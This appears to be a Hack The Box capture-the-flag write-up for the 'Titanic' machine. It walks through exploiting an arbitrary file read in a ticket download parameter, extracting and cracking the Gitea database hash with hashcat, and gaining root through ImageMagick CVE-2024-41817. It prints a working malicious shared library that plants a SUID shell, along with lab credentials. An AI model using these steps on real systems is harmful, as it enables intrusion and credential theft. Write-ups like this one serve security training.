<h1>TITANIC WRITE UP</h1>

<img width="697" height="382" alt="titanic" src="https://github.com/user-attachments/assets/6ef2dc58-f9a2-4d9c-ba07-5270679e5d58" /><br>

<h2>MACHINE INFORMATION</h2>

<b>Difficulty:</b> Easy<br> <b>Operating System:</b> Linux<br> <b>IP Address:</b> 10.10.11.55<br> <b>Hostname:</b> titanic.htb, dev.titanic.htb<br> <b>Open Ports:</b> 22/tcp, 80/tcp<br> <b>Web Server:</b> Apache2 v2.4.52(Ubuntu)<br> <b>Addition:</b> Gitea, Magick<br>

<h2>SUMMARY</h2>

Titanic is an easy difficulty Linux machine running an Apache web server on port 80. The website provides a booking functionality that is vulnerable to Arbitrary File Read through the ticket download mechanism. This vulnerability can be used to read sensitive files, including the <code>/etc/hosts</code> file and the Gitea configuration.

The configuration reveals the location of the Gitea data directory, which allows the Gitea SQLite database to be downloaded. The database contains the <code>developer</code> user's password hash. After converting the hash into a format supported by Hashcat and cracking it, I obtain the user's password and connect to the machine through SSH.

After gaining access as the <code>developer</code> user, I find a script in <code>/opt/scripts</code> that is executed periodically and uses the <code>magick</code> binary. The installed version of ImageMagick is vulnerable to CVE-2024-41817. By exploiting this vulnerability with a malicious shared library, I obtain a root shell and get the root flag.

<h3>STEP BY STEP</h3>

<b>1-</b> First start with nmap scan

<code>nmap -sC -sV 10.10.11.55</code>

Result:

<img width="766" height="316" alt="ss1" src="https://github.com/user-attachments/assets/8ba1cd37-f91d-486d-95ae-6ecec48ea9b9" /><br>

As I can see ports 22(SSH) and 80(HTTP) are open. The scan also gives me the host name "titanic.htb".

<b>2-</b> Add "titanic.htb" host name to my "/etc/hosts"

<code>echo "10.10.11.55 titanic.htb" | sudo tee -a /etc/hosts</code>

<b>3-</b> Visit "[http://titanic.htb](http://titanic.htb)".

<img width="1366" height="688" alt="ss2" src="https://github.com/user-attachments/assets/34456678-d8fa-4e76-b55c-3b8c1c065b9f" /><br>

The application has a booking functionality.

<b>4-</b> When I try the booking function, a booking form appears.

<img width="498" height="563" alt="ss3" src="https://github.com/user-attachments/assets/ba71f1b2-17b3-4196-9f81-b2e356669e96" /><br>

I fire up Burp Suite to inspect the request and intercept the booking request. The booking request is sent to "/book".

<img width="587" height="224" alt="ss4" src="https://github.com/user-attachments/assets/42912f6c-ab2e-4bd3-b8a5-262641dc70bc" /><br>

At this point there is nothing particularly interesting in the request.

<b>5-</b> After forwarding the request, the system makes another request to "/download?ticket=".

<img width="588" height="149" alt="ss5" src="https://github.com/user-attachments/assets/993d3ea6-f99e-4acf-8c02-cdf771b6cc3f" /><br>

The system creates a JSON file containing my ticket information and uses a UUID as the file name. With this request, the system retrieves the generated file for download.

<b>6-</b> When I see a parameter being used to retrieve a file, I immediately test whether arbitrary files can be read. I try "/etc/passwd" as the "ticket" parameter value.

<img width="1310" height="424" alt="ss6" src="https://github.com/user-attachments/assets/6826dfc5-e24e-45d4-9359-b75793ad234d" /><br>

The request successfully returns the contents of the file. Therefore, I can read arbitrary files from the system. In the output, I can also see a user named "developer".

<b>7-</b> At this point I can try to read the user flag directly. HTB machines commonly store the user flag as "user.txt" under the user's home directory, so I try "/home/developer/user.txt" as the "ticket" parameter value.

<img width="1172" height="178" alt="ss7" src="https://github.com/user-attachments/assets/d54959f5-6110-49db-89df-e4fcd39ccbfd" /><br>

The response contains the user flag. This is how I obtain the user flag through the Arbitrary File Read vulnerability.

<b>8-</b> I continue gathering information about the system and read "/etc/hosts".

<img width="1112" height="307" alt="ss8" src="https://github.com/user-attachments/assets/27c09e06-c62a-4398-a523-c53a31882e18" /><br>

The file contains another hostname, "dev.titanic.htb", which indicates another virtual host.

<b>9-</b> Add the new hostname to my "/etc/hosts" file

<img width="384" height="20" alt="ss9" src="https://github.com/user-attachments/assets/91dc99ec-757a-445f-a46d-b1a8028da7b3" /><br>

<b>10-</b> Visit "[http://dev.titanic.htb](http://dev.titanic.htb)".

<img width="1366" height="687" alt="ss10" src="https://github.com/user-attachments/assets/267e06aa-3957-4ec7-a67b-d784090e31cc" /><br>

There is a Gitea instance running on this virtual host.

<b>11-</b> In the "Explore" tab I find some useful information.

<img width="1366" height="279" alt="ss11" src="https://github.com/user-attachments/assets/f944720e-fde2-48d0-8f7b-9f00a0732c2a" /><br>

I already know that "developer" is an existing user on the system. There are also two repositories:

<ul>
<li><b>docker-config</b> - Docker configuration</li>
<li><b>flask app</b> - Main application repository for titanic.htb</li>
</ul>

<b>12-</b> In the "docker-config" repository, I find configuration folders for Gitea and MySQL.

<img width="1283" height="145" alt="ss12" src="https://github.com/user-attachments/assets/22039eb1-822e-4c89-9105-4958565cf16d" /><br>

<b>13-</b> In the "gitea" folder there is a "docker-compose.yml" file.

<img width="578" height="300" alt="ss13" src="https://github.com/user-attachments/assets/02bfa9bd-5772-443d-834c-7a9587cac6b4" /><br>

According to this file, the important information is the "volumes:" section:

<code>/home/developer/gitea/data:/data</code>

This means the main Gitea data directory on the system is "/home/developer/gitea/data".

<b>14-</b> In the "mysql" folder there is another "docker-compose.yml" file.

<img width="395" height="277" alt="ss14" src="https://github.com/user-attachments/assets/37d097ea-50d5-4216-a4b2-5533f59584fe" /><br>

From this configuration, I can obtain the MySQL database password:

<code>MySQLP@$$w0rd!</code>

<b>15-</b> I start researching Gitea and find the <a href="https://docs.gitea.com/administration/config-cheat-sheet">Gitea configuration documentation</a>, which contains information about configuration file locations.

<img width="817" height="249" alt="ss15" src="https://github.com/user-attachments/assets/2de63075-8d82-4169-9f7b-70731af3dfc4" /><br>

Based on this documentation and the directory information obtained earlier, I can determine that the Gitea configuration file should be located at:

<code>/home/developer/gitea/data/gitea/conf/app.ini</code>

<b>16-</b> I go back to "titanic.htb" and use the Arbitrary File Read vulnerability again. I provide "/home/developer/gitea/data/gitea/conf/app.ini" as the "ticket" parameter value.

<img width="1007" height="430" alt="ss16" src="https://github.com/user-attachments/assets/61d8ba3b-9880-40be-bd8a-ab08ffb28b18" /><br>

The response contains the Gitea configuration information.

<b>17-</b> I look at the "database" section of the configuration.

<img width="203" height="151" alt="ss17" src="https://github.com/user-attachments/assets/28134f6f-2824-4fed-8ac9-1d0f7eef8ee4" /><br>

In the "PATH" field I find:

<code>/data/gitea/gitea.db</code>

Combining this path with the Docker volume mapping discovered earlier, the SQLite database should be located at:

<code>/home/developer/gitea/data/gitea/gitea.db</code>

<b>18-</b> I go back to "/download" and use "/home/developer/gitea/data/gitea/gitea.db" as the "ticket" parameter value.

<img width="1010" height="427" alt="ss18" src="https://github.com/user-attachments/assets/72073b58-c612-4a7a-8df4-6a075b1c2a49" /><br>

This allows me to download the Gitea database.

<b>19-</b> First I check the database file type

<code>file gitea.db</code>

Result:

<img width="1327" height="47" alt="ss19" src="https://github.com/user-attachments/assets/0f686cc1-5281-46b0-b051-d3f6296ccbe3" /><br>

The result shows that this is an SQLite database, so I can use "sqlite3" to examine it.

<b>20-</b> I start examining "gitea.db"

<code>sqlite3 gitea.db</code>

Result:

<img width="350" height="78" alt="ss20" src="https://github.com/user-attachments/assets/128f1a98-672a-4db7-a857-ac6e1670b49a" /><br>

<b>21-</b> I want to see which tables exist in the database. For that, inside sqlite3:

<code>.tables</code>

Result:

<img width="378" height="615" alt="ss21" src="https://github.com/user-attachments/assets/56b98fdf-d025-4572-82ef-57e918a117ca" /><br>

There are many tables in the database, but the "user" table immediately catches my attention.

<b>22-</b> I want to see all information from the "user" table

<code>.headers on</code>

This enables column headers to be displayed together with the data.

<code>SELECT * FROM user;</code>

Result:

<img width="1348" height="192" alt="ss22" src="https://github.com/user-attachments/assets/3950f7d6-51b5-45b0-915d-cd93b921454a" /><br>

The output contains the information I need. I can now identify the "developer" user's password hash and the hashing algorithm used by Gitea.

<b>23-</b> Gitea stores passwords using a format that needs to be converted before it can be used with Hashcat. During my research I find the <a href="https://github.com/unix-ninja/hashcat/blob/master/tools/gitea2hashcat.py">gitea2hashcat.py</a> script in the Hashcat GitHub repository.

<code>python3 gitea2hashcat.py "e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56"</code>

Result:

<img width="1325" height="78" alt="ss23" src="https://github.com/user-attachments/assets/38503530-7564-48e5-aa5c-113a0f5fbf5d" /><br>

The script produces a Hashcat-compatible representation of the password hash.

<b>24-</b> The database indicates that the hashing algorithm is "pbkdf2$50000$50". Hashcat provides several options that can be used for PBKDF2.

<img width="224" height="70" alt="ss24" src="https://github.com/user-attachments/assets/112b2549-9e80-4ab0-879c-82921f5a1724" /><br>

The appropriate mode is "10900 | PBKDF2-HMAC-SHA256", because the converted value uses SHA-256 and the database specifies PBKDF2.

<code>hashcat -m 10900 "sha256:50000:DObwf8m1V7wHD6e+92oNFQ==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=" /usr/share/wordlists/rockyou.txt</code>

As a result, I obtain the following credentials:

<code>username=developer
password=25282528</code>

<b>25-</b> Now I can connect to the target system over SSH as "developer"

<code>ssh [developer@titanic.htb](mailto:developer@titanic.htb)</code>

Result:

<img width="958" height="586" alt="ss25" src="https://github.com/user-attachments/assets/45e0f2bd-618a-4533-a4a5-4a9431ed4857" /><br>

After logging in, I can access the user flag. The earlier Arbitrary File Read method worked, but obtaining the flag after gaining SSH access is a more direct approach from the compromised user's shell.

<img width="241" height="35" alt="ss26" src="https://github.com/user-attachments/assets/990e5960-5865-4879-aa0c-c0f7ebfcf696" /><br>

<b>26-</b> I start looking for privilege escalation opportunities. In the target system, I find "identify_images.sh" under "/opt/scripts".

<img width="487" height="86" alt="ss27" src="https://github.com/user-attachments/assets/5ae8efdc-fb18-492d-8e70-4e59df7418c1" /><br>

<code>cat /opt/scripts/identify_images.sh</code>

Result:

<img width="863" height="70" alt="ss28" src="https://github.com/user-attachments/assets/3ac93f4e-84a5-4bf4-9661-cdb0d0589b98" /><br>

The script uses the "magick" binary to process images.

<b>27-</b> The use of "magick" catches my attention, so I check its version

<code>magick --version</code>

Result:

<img width="1030" height="119" alt="ss29" src="https://github.com/user-attachments/assets/a7e22bfb-cd5f-4d64-8697-3f39a1b6815e" /><br>

The installed version is vulnerable to CVE-2024-41817. During my research I find the corresponding <a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8">ImageMagick security advisory</a>.

<b>28-</b> I look at "/opt/app/static/assets/images", which is referenced by the script. There I find the "metadata.log" file, and I also notice that the script is executed periodically.

To observe the file activity, I use:

<code>ls -l</code> x2

Result:

<img width="559" height="264" alt="ss30" src="https://github.com/user-attachments/assets/7ada6e94-7348-4ee2-9c0d-ced97a7a33d5" /><br>

The periodic execution indicates that the script is processing files in this directory.

<b>29-</b> Based on CVE-2024-41817, I prepare a malicious shared library

<code>gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

**attribute**((constructor)) void init(){
system("cp /bin/sh /tmp && chmod u+s /tmp/sh");
exit(0);
}
EOF</code>

Result:

<img width="219" height="42" alt="ss31" src="https://github.com/user-attachments/assets/8d15b649-3510-4ed6-a54e-c9045261b63a" /><br>

After executing the command, I wait for the periodic script execution. When the vulnerable "magick" process loads the malicious library, the payload creates a SUID copy of "/bin/sh" under "/tmp/sh".

<b>30-</b> Finally, from "/opt/app/static/assets/images" I execute the shell with the "-p" flag

<code>/tmp/sh -p</code>

Result:

<img width="776" height="154" alt="ss32" src="https://github.com/user-attachments/assets/a32ce4a5-3690-4c15-a9ab-b281ae9af147" /><br>

The shell runs with elevated privileges, giving me root access. This is how I obtain the root flag.

<h2>RESOURCE</h2>
<ul>
<li><a href="https://docs.gitea.com/administration/config-cheat-sheet">GITEA DOCUMENTATION</a></li>
<li><a href="https://github.com/unix-ninja/hashcat/blob/master/tools/gitea2hashcat.py">HASHCAT GITEA2HASHCAT.PY</a></li>
<li><a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8">IMAGEMAGICK CVE-2024-41817</a></li>
</ul>
